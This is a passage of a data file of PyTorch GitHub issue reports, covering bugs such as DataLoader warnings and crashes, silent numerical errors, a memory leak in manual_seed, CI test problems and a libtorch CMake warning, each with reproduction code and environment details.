cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @aocsa @nikitaved @pearu @mruberry",True
Flake8 triggers E902 FileNotFoundError: [Errno 2] No such file or directory module: ci triaged,"## üêõ Bug
Per title
PR is blocked due to the test.

## To Reproduce

1. Remove any file
1. run `make quicklint -j 6` or `python tools/actions_local_runner.py --file-filter '.py' --changed-only --job 'flake8-py3'`
1. `E902 FileNotFoundError: [Errno 2] No such file or directory`

## Expected behavior

No error and CI is green

I think we need to filter out the deleted file from here:
https://github.com/pytorch/pytorch/blob/098d9975a7c6b33ada382bd51f322f7f5c694a17/tools/actions_local_runner.py#L62-L82


cc @ezyang @seemethere @malfet @walterddr @pytorch/pytorch-dev-infra",True
Remove beta warning for `use_deterministic_algorithms` triaged module: determinism,"Since `use_deterministic_algorithms` is stable for 1.9, we can remove beta warnings.

cc @mruberry @kurtamohler",True
COO to CSR tensor conversion is slow module: performance module: sparse triaged enhancement open source,"Originally raised in https://github.com/pytorch/pytorch/pull/50937#discussion_r604346660

The COO to CSR tensor conversion is implemented in
https://github.com/pytorch/pytorch/blob/3a777b67926c5f02bc287b25e572c521d6d11fb0/torch/_tensor.py#L928-L940
and it consists of two time-consuming parts:
- coalescing if the COO tensor is uncoaleasced
- row indices compression procedure

Indeed, taking a coalesced COO sample with `size=(1000, 1000)` and `nnz=500`, about 1.5% of the `to_sparse_csr` call time is spend in coalescing and 98% of the time in running the row indices compression loop.

The slowness of the row indices compression loop has two origins:
- it is implemented in Python
- it uses a suboptimal algorithm

Indeed, a sample of row indices with `size[0] == 1000` and `nnz=500`, a pure Python algorithm in
https://github.com/pearu/gcs/blob/b54ba0cba9c853b797274ef26b6c42386f2cafa3/gcs/storage.py#L24-L45
is about 3x faster than used in `to_sparse_csr`, and when applying `numba.njit` to the `compress_indices` function, about 83x speedup is achieved compared to `to_sparse_csr`.

The performance of COO to CSR tensor conversion can be improved by implementing a more efficient row indices compression algorithm (see `compress_indices` referenced above) in C++.

cc @VitalyFedyunin @ngimel @aocsa @nikitaved @pearu @mruberry",True
`Warning: Leaking Caffe2 thread-pool after fork` when using `DataLoader` with `num_workers>0` and `pin_memory=True` module: dataloader triaged,"## üêõ Bug

When using a `DataLoader` with `num_workers>0` and `pin_memory=True`, warnings trigger about `Leaking Caffe2 thread-pool after fork`. This warning shows multiple times, and populates the screen.
The warning doesn't trigger when either `num_workers=0` or `pin_memory=False`.

## To Reproduce

Steps to reproduce the behavior:

1. Run the following:
   ```python
    from torch.utils.data import DataLoader
    from torchvision.datasets import FakeData
    from torchvision.transforms import ToTensor
    
    
    def main():
        data = FakeData(transform=ToTensor())
        dataloader = DataLoader(data, num_workers=2, pin_memory=True)
        for e in range(1, 6):
            print(f'epoch {e}:')
            for _ in dataloader:
                pass
    
    
    if __name__ == '__main__':
        main()
    ```

### Output:
```
epoch 1:
epoch 2:
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
epoch 3:
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
epoch 4:
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
epoch 5:
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
[W pthreadpool-cpp.cc:88] Warning: Leaking Caffe2 thread-pool after fork. (function pthreadpool)
```

## Expected behavior

No warnings

## Environment

```
PyTorch version: 1.9.0.dev20210428
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: Could not collect

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration:
GPU 0: GeForce RTX 2080 Ti
GPU 1: GeForce RTX 2080 Ti
GPU 2: GeForce RTX 2080 Ti
GPU 3: GeForce RTX 2080 Ti
GPU 4: GeForce RTX 2080 Ti
GPU 5: GeForce RTX 2080 Ti
GPU 6: GeForce RTX 2080 Ti
GPU 7: GeForce RTX 2080 Ti

Nvidia driver version: 460.32.03
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.1
[pip3] torch==1.9.0.dev20210428
[pip3] torchaudio==0.9.0a0+999026d
[pip3] torchvision==0.10.0.dev20210428
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               11.1.74              h6bb024c_0    nvidia
[conda] mkl                       2021.2.0           h06a4308_296
[conda] mkl-service               2.3.0            py38h27cfd23_1
[conda] mkl_fft                   1.3.0            py38h42c9631_2
[conda] mkl_random                1.2.1            py38ha9443f7_2
[conda] numpy                     1.20.1           py38h93e21f0_0
[conda] numpy-base                1.20.1           py38h7d8b39e_0
[conda] pytorch                   1.9.0.dev20210428 py3.8_cuda11.1_cudnn8.0.5_0    pytorch-nightly
[conda] torchaudio                0.9.0.dev20210428            py38    pytorch-nightly
[conda] torchvision               0.10.0.dev20210428      py38_cu111    pytorch-nightly
```

## Additional context

It looks like this warning was introduced in https://github.com/pytorch/pytorch/pull/54895. I don't quite follow the details there, though.

cc @SsnL @VitalyFedyunin @ejguan",True
torch.std/var of complex should return a real result module: bc-breaking triaged module: complex module: numpy,"## üêõ Bug

In NumPy `std` and `var` of complex arrays returns a real result, but `torch.std`/`var` return a complex tensor with zero imaginary component.

## To Reproduce

Need to pass dim=0 needed because of #51127
```python
>>> import torch
>>> torch.rand(100, dtype=torch.complex128).var(dim=0).dtype
torch.complex128
>>> torch.rand(100, dtype=torch.complex128).std(dim=0).dtype
torch.complex128
```

Compare to NumPy:
```python
>>> import numpy as np
>>> np.random.rand(100).astype(complex).var().dtype
dtype('float64')
>>> np.random.rand(100).astype(complex).std().dtype
dtype('float64')
```

## Environment

I've confirmed it's worked like this since at least PyTorch 1.6.

```
PyTorch version: 1.8.1
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Pop!_OS 20.10 (x86_64)
GCC version: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
Clang version: 11.0.0-2
CMake version: version 3.16.3

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 11.1.105
GPU models and configuration: GPU 0: GeForce RTX 2060 SUPER
Nvidia driver version: 460.67
cuDNN version: Probably one of the following:
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_adv_infer.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_adv_train.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_cnn_infer.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_cnn_train.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_ops_infer.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_ops_train.so.8.0.4
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.2
[pip3] torch==1.8.1
[conda] blas                      1.0                         mkl  
[conda] cudatoolkit               11.1.1               h6406543_8    conda-forge
[conda] mkl                       2020.2                      256  
[conda] numpy                     1.20.2           py38h9894fe3_0    conda-forge
[conda] pytorch                   1.8.1           py3.8_cuda11.1_cudnn8.0.5_0    pytorch
```


cc @ezyang @gchanan @anjali411 @dylanbespalko @mruberry @rgommers @heitorschueroff",True
Out variant of torch.inner incorrectly broadcasts triaged module: numpy module: linear algebra module: correctness (silent),"## üêõ Bug

Per title

Currently, we directly `copy_` the result into the output tensor.
https://github.com/pytorch/pytorch/blob/d490e0120f32dcbb8b23e11eebd638b96b4b0898/aten/src/ATen/native/Linear.cpp#L644
If the output tensor can be broadcasted from result, it would generate wrong output.

## To Reproduce

```py
>>> a = torch.randn(5)
>>> b = torch.randn(5)
>>> torch.inner(a, b)
tensor(-4.2595)
>>> c = torch.randn(2)
>>> torch.inner(a, b, out=c)
tensor([-4.2595, -4.2595])
```

## Expected
```py
>>> a = torch.randn(5)
>>> b = torch.randn(5)
>>> torch.inner(a, b)
tensor(-4.2595)
>>> c = torch.randn(2)
>>> torch.inner(a, b, out=c)  # c should be resized to shape([1])
tensor([-4.2595])
```

cc @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @rgommers",True
Test suite doesn't skip geqrf (and other tests) when LAPACK isn't available triaged module: linear algebra module: testing,"```
======================================================================
ERROR: test_geqrf_meta_float32 (__main__.TestTensorDeviceOpsMETA)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/data/users/ezyang/pytorch-tmp/torch/testing/_internal/common_utils.py"", line 1030, in wrapper
    method(*args, **kwargs)
  File ""/data/users/ezyang/pytorch-tmp/torch/testing/_internal/common_device_type.py"", line 297, in instantiated_test
    raise rte
  File ""/data/users/ezyang/pytorch-tmp/torch/testing/_internal/common_device_type.py"", line 292, in instantiated_test
    result = test_fn(self, *args)
  File ""/data/users/ezyang/pytorch-tmp/torch/testing/_internal/common_device_type.py"", line 595, in dep_fn
    return fn(slf, device, *args, **kwargs)
  File ""test/test_torch.py"", line 7383, in fn
    cpu_result = getattr(cpu_tensor, op_str)(*cpu_args)
RuntimeError: geqrf: Lapack library not found in compile time
 at /data/users/ezyang/pytorch-tmp/aten/src/TH/generic/THLapack.cpp:40
```

This should be a skip not a fail.


cc @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk",True
torch.manual_seed leaks memory high priority module: memory usage triaged module: random,"## üêõ Bug

Calling `torch.manual_seed(...)` (or `torch.cuda.manual_seed_all(...)`) leaks memory, quite a bit in fact. I am resetting the seed in my data loader for each sample and over the course of a few hours there are tens of gigabytes that are being leaked.

## To Reproduce

```
for i in range(1000000000): torch.manual_seed(i)
```

And watch the memory consumption of the process slowly creep up.

## Expected behavior

The memory consumption to remain constant, as is the case with `for i in range(1000000000): random.seed(i)`.

## Environment

```
PyTorch version: 1.8.1+cu102
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.2 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: 10.0.0-4ubuntu1 
CMake version: version 3.19.6

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: GeForce GTX 1650
Nvidia driver version: 460.39
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A
```


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @pbelevich",True
addmv_() allows resizing the tensor it operates on and produces wrong results high priority triaged module: linear algebra module: correctness (silent),"```
a = torch.randn((1,))
b = torch.randn((3, 4))
c = torch.randn((4,))

# this should error out
a.addmv_(b, c)
: tensor([ 2.2854,  1.4802, -1.4424])
```

This operation should fail. Discovered by @Lilyjjo (see https://github.com/pytorch/pytorch/issues/55539).

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk",True
OpInfo tests should check that for inplace operations tensor storage doesn't change.  module: tests triaged hackathon,"Per title, this check should probably be added to test_variant_consistency test. 
Context: 
#53655 broke this for inplace `index_add_` operation when type promotion is used in index_add_.

cc @mruberry @VitalyFedyunin @walterddr",True
Irrelevant named tensor warnings high priority module: nn triaged module: named tensor,"## üêõ Bug
This code:
```
import torch
import torch.nn as nn

input_tensor = torch.ones((1, 32, 128, 128), dtype=torch.float)
cs = nn.ChannelShuffle(groups=2)
cs(input_tensor)
```

produces irrelevant warning:

> /home/user/PyTorch/dist-packages/release/torch/nn/modules/channelshuffle.py:46: UserWarning: Named tensors and all their associated APIs are an experimental feature and subject to change. Please do not use them for anything important until they are released as stable. (Triggered internally at  ../c10/core/TensorImpl.h:973.)
>   return F.channel_shuffle(input, self.groups)

as no named tensors are used.

## Expected behavior

No warnings

## Environment

 - PyTorch Version (e.g., 1.0): current master
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): source

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @albanD @mruberry",True
Segmentation fault in DataLoader worker in PyTorch 1.8.0 if set_num_threads is called beforehand high priority module: multiprocessing module: dataloader triaged module: multithreading,"## üêõ Bug

A segmentation fault occurs if one uses `DataLoader` with `num_workers` > 0 after calling `set_num_threads` with a sufficiently high value.
I observed this behaviour in PyTorch 1.8.0 and 1.8.1, but I am unable to reproduce it with PyTorch 1.7.1.

## To Reproduce

```
import torch

def main():
    torch.set_num_threads(4)

    dataloader = torch.utils.data.DataLoader([1, 2, 3], num_workers=1)
    iter(dataloader).next()

    return

if __name__ == '__main__':
    main()
```

The above code crashes when `set_num_threads` is called with 4 or more as its argument.
Incidentally (or maybe not) 4 is the number of vCPUs in the AWS EC2 instance I am using.

## Expected behavior

No crash.

## Environment

```
PyTorch version: 1.8.1+cu102
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.2 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: Could not collect

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: Tesla K80
Nvidia driver version: 460.32.03
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.1
[pip3] torch==1.8.1
[conda] Could not collect
```
## Additional context

Perhaps this issue is related to #53894 and #54716.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @SsnL @VitalyFedyunin @ejguan",True
SyncBatchNorm raises exception when affine=False high priority module: nn triaged module: data parallel,"## üêõ Bug

In nn.SyncBatchNorm:

There is a call to weight.contiguous() there:
https://github.com/pytorch/pytorch/blob/27048c1dfa80effabf17b8dca66cd2724dd502f8/torch/nn/modules/_functions.py#L12

But weight can be None if affine = False.
https://github.com/pytorch/pytorch/blob/27048c1dfa80effabf17b8dca66cd2724dd502f8/torch/nn/modules/batchnorm.py#L44 

So it crashes.

Bug was introduced in:
https://github.com/pytorch/pytorch/commit/d30f4d1dfd5237d89834363ce2cff9de4ee92811


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @albanD @mruberry",True
Conv2d on Apple M1 returns NaN's high priority module: convolution triaged module: macos module: correctness (silent) module: arm,"## üêõ Bug

Convolutional layer Conv2d on M1 randomly returns NaN's
(by randomly I mean it happens approximately every fourth time layer being called)

## To Reproduce

```
import torch

conv = torch.nn.Conv2d(1, 16, 3, stride=1)
for c in range(100):
	x = torch.randn(1, 80, 140)
	x = x.unsqueeze(1)
	x = conv(x)
	if torch.isnan(torch.sum(x)):
		print(c)
```

## Expected behavior

Conv2d shouldn't return NaNs

## Environment

Collecting environment information...
PyTorch version: 1.9.0a0+gitd54be1a
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: macOS 11.2.3 (arm64)
GCC version: Could not collect
Clang version: 12.0.0 (clang-1200.0.32.29)
CMake version: version 3.19.6

Python version: 3.8 (64-bit runtime)
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.1
[pip3] torch==1.9.0a0+gitd54be1a
[pip3] torchvision==0.9.0a0+414427d
[conda] numpy                     1.20.1           py38h9e6c65a_0    conda-forge
[conda] torch                     1.9.0a0+gitd54be1a          pypi_0    pypi
[conda] torchvision               0.9.0a0+414427d          pypi_0    pypi

## Additional context



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @malfet",True
Silently incorrect convolution on CUDA without cuDNN high priority triaged,"## üêõ Bug

```
import torch
import torch.nn as nn
model = nn.Conv2d(64, 128, [1, 1], [2, 2], [0, 0])
x = torch.randn(1, 64, 8, 8)

model.cuda()
result_cudnn = model(x.cuda())

torch.backends.cudnn.enabled=False
result = model(x.cuda())

assert torch.allclose(result, result_cudnn)
```
The above code asserts. This convolution (with batch size > 1) is important because it's present in resnet; the bug makes it so that resnet stops training. I guess I am the first person to run into this so the conclusion may be that no one uses CUDA convolutions without cudnn.

## Additional context

On master, but I can provide more information as necessary.


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411",True
"""Report Results"" test intermittently fails for unsharded tests with ""Duplicate test case..."" module: ci triaged","See https://app.circleci.com/pipelines/github/pytorch/pytorch/284234/workflows/a9fb7db0-33f6-4364-9ec0-16dfb35052c6/jobs/11485715 for example:
```
Mar 12 01:36:17     raise RuntimeWarning(f'Duplicate test case {test_case.name} in suite {suite_name} called from {self.name}')
Mar 12 01:36:17 RuntimeWarning: Duplicate test case test_AdaptiveMaxPool1d_indices_cpu_float32 in suite TestNNDeviceTypeCPU called from test_nn
```

This happens because test_nn was selected twice, first time into shard1 when AWS was unaccessible and 2nd time into shard 2, when AWS becomes accessible:
```
Mar 11 23:59:28 + test_python_shard1
Mar 11 23:59:28 + python test/run_test.py --exclude-jit-executor --shard 1 2 --verbose --determine-from=
Mar 11 23:59:30 Grabbing reports from nightly commit: 30b9583650c9d9ad4e1172c92bf57ec3f255061b
Mar 11 23:59:30 Selected tests: test_autograd, test_nn, distributed/rpc/test_process_group_agent, test_unary_ufuncs, test_jit, test_xnnpack_integration, distributed/rpc/test_faulty_agent, distributed/test_distributed_fork, test_cpp_extensions_jit, test_dataloader, test_tensor_creation_ops, test_type_hints, test_tensorboard, test_binary_ufuncs, test_sparse, test_multiprocessing, test_determination, test_foreach, test_utils, test_view_ops, distributed/test_c10d_spawn, test_cpp_api_parity, test_multiprocessing_spawn, test_openmp, test_vmap, test_mobile_optimizer, test_shape_ops, test_indexing, test_namedtuple_return_api, test_namedtensor, test_logging, test_jit_py3, benchmark_utils/test_benchmark_utils, distributed/test_nccl, test_futures, test_bundled_inputs, test_jit_disabled, test_function_schema, test_cpp_extensions_aot_ninja, distributed/test_jit_c10d, test_pytree, test_show_pickle, test_license, distributed/nn/jit/test_instantiator, test_public_bindings, test_vulkan, test_dataset, distributions/test_constraints, test_pruning_op, distributed/pipeline/sync/skip/test_api, distributed/pipeline/sync/skip/test_gpipe, distributed/pipeline/sync/skip/test_inspect_skip_layout, distributed/pipeline/sync/skip/test_leak, distributed/pipeline/sync/skip/test_portal, distributed/pipeline/sync/skip/test_stash_pop, distributed/pipeline/sync/skip/test_tracker, distributed/pipeline/sync/skip/test_verify_skippables, distributed/pipeline/sync/test_balance, distributed/pipeline/sync/test_bugs, distributed/pipeline/sync/test_checkpoint, distributed/pipeline/sync/test_copy, distributed/pipeline/sync/test_deferred_batch_norm, distributed/pipeline/sync/test_dependency, distributed/pipeline/sync/test_inplace, distributed/pipeline/sync/test_microbatch, distributed/pipeline/sync/test_phony, distributed/pipeline/sync/test_pipe, distributed/pipeline/sync/test_pipeline, distributed/pipeline/sync/test_stream, distributed/pipeline/sync/test_transparency, distributed/pipeline/sync/test_worker
...
Mar 12 00:47:02 + test_python_shard2
Mar 12 00:47:02 + python test/run_test.py --exclude-jit-executor --shard 2 2 --verbose --determine-from=
Mar 12 00:47:04 Selected tests: test_ops, test_nn, distributed/rpc/test_tensorpipe_agent, test_linalg, distributed/test_distributed_spawn, distributed/rpc/test_faulty_agent, distributed/test_distributed_fork, test_spectral_ops, test_mkldnn, test_tensor_creation_ops, test_functional_autograd_benchmark, test_tensorboard, test_optim, test_binary_ufuncs, distributions/test_distributions, test_determination, test_foreach, test_type_promotion, distributed/optim/test_zero_redundancy_optimizer, distributed/test_c10d_spawn, test_cpp_api_parity, test_sort_and_select, test_fx, test_fx_experimental, test_mobile_optimizer, test_shape_ops, test_indexing, test_namedtuple_return_api, test_op_aliases, test_logging, test_testing, benchmark_utils/test_benchmark_utils, test_futures, test_numpy_interop, test_complex, test_native_functions, test_numba_integration, test_function_schema, distributed/test_jit_c10d, test_pytree, test_show_pickle, test_license, distributed/nn/jit/test_instantiator, test_public_bindings, test_dataset, test_vulkan, distributions/test_constraints, test_pruning_op, distributed/pipeline/sync/skip/test_api, distributed/pipeline/sync/skip/test_gpipe, distributed/pipeline/sync/skip/test_inspect_skip_layout, distributed/pipeline/sync/skip/test_leak, distributed/pipeline/sync/skip/test_portal, distributed/pipeline/sync/skip/test_stash_pop, distributed/pipeline/sync/skip/test_tracker, distributed/pipeline/sync/skip/test_verify_skippables, distributed/pipeline/sync/test_balance, distributed/pipeline/sync/test_bugs, distributed/pipeline/sync/test_checkpoint, distributed/pipeline/sync/test_copy, distributed/pipeline/sync/test_deferred_batch_norm, distributed/pipeline/sync/test_dependency, distributed/pipeline/sync/test_inplace, distributed/pipeline/sync/test_microbatch, distributed/pipeline/sync/test_phony, distributed/pipeline/sync/test_pipe, distributed/pipeline/sync/test_pipeline, distributed/pipeline/sync/test_stream, distributed/pipeline/sync/test_transparency, distributed/pipeline/sync/test_worker
Mar 12 00:47:04 Running test_ops ... [2021-03-12 00:47:04.744114]
Mar 12 00:47:04 Executing ['/opt/conda/bin/python', 'test_ops.py', '-v'] ... [2021-03-12 00:47:04.744142]
Mar 12 00:47:04 Grabbing reports from nightly commit: 56e7889e526256d9c16bce6ac84bdb3ea206bd79
```

cc @ezyang @seemethere @malfet @walterddr @pytorch/pytorch-dev-infra",True
test_stft_requires_complex in test_spectral_ops.py should be skipped if not compiled with MKL module: tests triaged module: testing,"## üêõ Bug

`test_stft_requires_complex` (in `test/test_spectral_ops.py`) errors if ATen is compiled without MKL. I expect that this test requires `@skipCPUIfNoMkl` before `def test_stft_requires_complex(self, device):` to skip it. I'm not sure if that test should also be skipped if there is no ROCM (which it is in the other tests in that section).

```
======================================================================
ERROR: test_stft_requires_complex_cpu (__main__.TestFFTCPU)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/rds/bear-apps/devel/eb-sjb-up/EL8/EL8-cas/software/PyTorch/1.8.0-foss-2020b/lib/python3.8/site-packages/torch/testing/_internal/common_device_type.py"", line 295, in instantiated_test
    raise rte
  File ""/rds/bear-apps/devel/eb-sjb-up/EL8/EL8-cas/software/PyTorch/1.8.0-foss-2020b/lib/python3.8/site-packages/torch/testing/_internal/common_device_type.py"", line 290, in instantiated_test
    result = test_fn(self, *args)
  File ""test_spectral_ops.py"", line 939, in test_stft_requires_complex
    y = x.stft(10, pad_mode='constant')
  File ""/rds/bear-apps/devel/eb-sjb-up/EL8/EL8-cas/software/PyTorch/1.8.0-foss-2020b/lib/python3.8/site-packages/torch/tensor.py"", line 453, in stft
    return torch.stft(self, n_fft, hop_length, win_length, window, center,
  File ""/rds/bear-apps/devel/eb-sjb-up/EL8/EL8-cas/software/PyTorch/1.8.0-foss-2020b/lib/python3.8/site-packages/torch/functional.py"", line 580, in stft
    return _VF.stft(input, n_fft, hop_length, win_length, window,  # type: ignore
RuntimeError: fft: ATen not compiled with MKL support

----------------------------------------------------------------------
```

## To Reproduce

Steps to reproduce the behavior:

1. Build PyTorch 1.8.0 release without MKL
1. Run tests

## Expected behavior

No test failure


cc @mruberry @VitalyFedyunin @walterddr",True
Failed to compute shorthash for libnvrtc.so when compiling application with libtorch 1.8.0 module: build triaged,"## üêõ Bug

When building an application with libtorch 1.8.0, I got this warning:
```console
CMake Warning at build/libtorch/share/cmake/Caffe2/public/cuda.cmake:198 (message):
  Failed to compute shorthash for libnvrtc.so
Call Stack (most recent call first):
  build/libtorch/share/cmake/Caffe2/Caffe2Config.cmake:88 (include)
  build/libtorch/share/cmake/Torch/TorchConfig.cmake:68 (find_package)
  CMakeLists.txt:109 (find_package)
```
The previous version 1.7.1 had no such warning. 

## To Reproduce

I had created a simple project to reproduce this: https://github.com/lamhoangtung/dummy-libtorch

To use it, run this on a machine with CUDA or the docker image `nvidia/cuda:11.1.1-cudnn8-devel-ubuntu20.04`:
```bash
git clone https://github.com/lamhoangtung/dummy-libtorch
cd dummy-libtorch
sudo apt update
sudo apt install unzip cmake
sh download_libtorch.sh
sh build.sh
```

The output shoud be like this:
```console
-- The C compiler identification is GNU 9.3.0
-- The CXX compiler identification is GNU 9.3.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Looking for pthread.h
-- Looking for pthread.h - found
-- Performing Test CMAKE_HAVE_LIBC_PTHREAD
-- Performing Test CMAKE_HAVE_LIBC_PTHREAD - Failed
-- Looking for pthread_create in pthreads
-- Looking for pthread_create in pthreads - not found
-- Looking for pthread_create in pthread
-- Looking for pthread_create in pthread - found
-- Found Threads: TRUE
-- Found CUDA: /usr/local/cuda-11.1 (found version ""11.1"")
-- Caffe2: CUDA detected: 11.1
-- Caffe2: CUDA nvcc is: /usr/local/cuda-11.1/bin/nvcc
-- Caffe2: CUDA toolkit directory: /usr/local/cuda-11.1
-- Caffe2: Header version is: 11.1
-- Found CUDNN: /usr/local/cuda-11.1/lib64/libcudnn.so
-- Found cuDNN: v8.1.1  (include: /usr/local/cuda-11.1/include, library: /usr/local/cuda-11.1/lib64/libcudnn.so)
CMake Warning at libtorch/share/cmake/Caffe2/public/cuda.cmake:198 (message):
  Failed to compute shorthash for libnvrtc.so
Call Stack (most recent call first):
  libtorch/share/cmake/Caffe2/Caffe2Config.cmake:88 (include)
  libtorch/share/cmake/Torch/TorchConfig.cmake:68 (find_package)
  CMakeLists.txt:4 (find_package)


-- Autodetected CUDA architecture(s):  8.6 6.1
-- Added CUDA NVCC flags for: -gencode;arch=compute_86,code=sm_86;-gencode;arch=compute_61,code=sm_61
-- Found Torch: /home/techainer/linus/dummy-libtorch/libtorch/lib/libtorch.so
-- Configuring done
-- Generating done
-- Build files have been written to: /home/techainer/linus/dummy-libtorch/build
Scanning dependencies of target simple_model
[ 50%] Building CXX object CMakeFiles/simple_model.dir/model.cpp.o
[100%] Linking CXX executable simple_model
[100%] Built target simple_model
```



## Expected behavior

No such warning above

## Environment

My environment was init from this docker images: `nvidia/cuda:11.1.1-cudnn8-devel-ubuntu20.04` 

```
PyTorch version: N/A
Is debug build: N/A
CUDA used to build PyTorch: N/A
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: version 3.19.5

Python version: 3.8 (64-bit runtime)
Is CUDA available: N/A
CUDA runtime version: 11.1.105
GPU models and configuration:
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce RTX 3090

Nvidia driver version: 460.56
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.0.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip] Could not collect
[conda] Could not collect
```

## Additional context

After doing some research, I found the warning will be raise from this: [cuda.cmake](https://github.com/pytorch/pytorch/blob/v1.8.0/cmake/public/cuda.cmake) file.

```cmake
 execute_process(
    COMMAND ""${PYTHON_EXECUTABLE}"" -c
    ""import hashlib;hash=hashlib.sha256();hash.update(open('${CUDA_NVRTC_LIB}','rb').read());print(hash.hexdigest()[:8])""
    RESULT_VARIABLE _retval
    OUTPUT_VARIABLE CUDA_NVRTC_SHORTHASH)
  if(NOT _retval EQUAL 0)
    message(WARNING ""Failed to compute shorthash for libnvrtc.so"")
    set(CUDA_NVRTC_SHORTHASH ""XXXXXXXX"")
```

Which mean that the python script: `""import hashlib;hash=hashlib.sha256();hash.update(open('${CUDA_NVRTC_LIB}','rb').read());print(hash.hexdigest()[:8])""` had failed.
```console
Traceback (most recent call last):
  File ""<string>"", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory: ''
```

I suspect that my shell does not had the variable `CUDA_NVRTC_LIB` configure properly. So I tried to find it, and set it to this according to this [documentation](https://docs.nvidia.com/cuda/nvrtc/index.html):
```bash
export CUDA_NVRTC_LIB=/usr/local/cuda-11.1/include/nvrtc.h
```

And then rerun the python script above and it seems to work with an output like this:
```console
703109d3
```

But the problem `Failed to compute shorthash for libnvrtc.so` still persist when I run cmake build



cc @malfet @seemethere @walterddr",True
